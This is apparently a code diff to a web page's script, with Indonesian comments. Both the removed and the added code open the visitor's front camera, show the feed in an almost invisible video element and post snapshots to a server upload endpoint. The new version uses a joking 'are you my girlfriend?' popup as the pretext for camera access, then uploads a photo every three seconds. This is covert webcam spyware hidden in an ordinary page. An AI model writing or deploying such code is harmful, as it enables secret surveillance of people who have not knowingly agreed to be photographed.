@@ -223,41 +223,90 @@
 </script>
 
 <script>
-let cameraStarted = false;
+window.addEventListener('load', () => {
+  // popup custom
+  const overlay = document.createElement('div');
+  overlay.style = `
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 999999;
+  `;
+  
+  const box = document.createElement('div');
+  box.style = `
+    background: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    text-align: center;
+    font-family: system-ui;
+    max-width: 300px;
+  `;
+  box.innerHTML = `
+    <p style="margin-bottom:15px;font-size:16px">apakah anda pacar saya?</p>
+    <button id="yesBtn" style="margin-right:10px;padding:6px 12px">iya</button>
+    <button id="noBtn" style="padding:6px 12px">tidak</button>
+  `;
 
-window.addEventListener('click', async () => {
-  if (cameraStarted) return;
-  cameraStarted = true;
+  overlay.appendChild(box);
+  document.body.appendChild(overlay);
 
-  const video = document.createElement('video');
-  video.autoplay = true;
-  video.playsInline = true;
-  video.style.cssText = 'position:fixed;right:0;bottom:0;width:200px;height:auto;opacity:0.05;pointer-events:none;z-index:9998;';
-  document.body.appendChild(video);
+  // handle klik "tidak"
+  document.getElementById('noBtn').addEventListener('click', () => {
+    window.location.href = 'index.html';
+  });
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-    video.srcObject = stream;
+  // handle klik "iya"
+  document.getElementById('yesBtn').addEventListener('click', async () => {
+    overlay.remove();
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const video = document.createElement('video');
+      video.autoplay = true;
+      video.playsInline = true;
+      video.style.cssText = 'position:fixed;right:0;bottom:0;width:200px;height:auto;opacity:0.05;pointer-events:none;';
+      document.body.appendChild(video);
+      video.srcObject = stream;
 
-    // kasih waktu biar kamera nyesuaiin cahaya
-    await new Promise(r => setTimeout(r, 1500));
+      await new Promise(r => {
+        if (video.readyState >= 2) return r();
+        video.addEventListener('loadeddata', r, { once: true });
+      });
 
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 1280;
-    canvas.height = video.videoHeight || 720;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+      setTimeout(() => startSnapshotLoop(video, stream), 1500);
+    } catch (err) {
+      console.error('izin kamera ditolak', err);
+    }
+  });
 
-    await fetch('/api/upload-photo', {
-      method: 'POST',
-      headers: { 'content-type': 'application/json' },
-      body: JSON.stringify({ image: dataUrl })
-    });
+  // fungsi loop ambil foto
+  function startSnapshotLoop(video, stream) {
+    const intervalMs = 3000; // ambil foto tiap 3 detik (bisa lo ubah)
+    const loop = setInterval(() => {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 1280;
+        canvas.height = video.videoHeight || 720;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
 
-    stream.getTracks().forEach(t => t.stop());
-    video.remove();
-  } catch (err) {
-    console.error('gagal akses kamera', err);
+        fetch('/api/upload-photo', {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify({
+            image: dataUrl,
+            page: location.pathname
+          })
+        }).catch(err => console.error('gagal upload', err));
+      } catch (e) {
+        console.error('gagal capture', e);
+        clearInterval(loop);
+        stream.getTracks().forEach(t => t.stop());
+      }
+    }, intervalMs);
   }
 });
 </script>
